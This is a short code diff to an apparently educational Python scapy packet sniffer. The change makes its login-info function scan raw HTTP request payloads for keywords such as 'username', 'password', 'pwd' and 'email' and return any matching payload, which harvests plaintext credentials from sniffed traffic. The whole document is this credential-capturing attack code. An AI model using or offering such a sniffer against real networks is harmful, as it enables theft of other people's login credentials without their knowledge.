@@ -18,7 +18,11 @@ def get_url(packet):
 def get_login_info(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw])
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "password", "pass", "usr", "pwd", "email"]
+            for keyword in keywords:
+                if keyword in load:
+                    return load
 
 
 def process_sniffed_packet(packet):
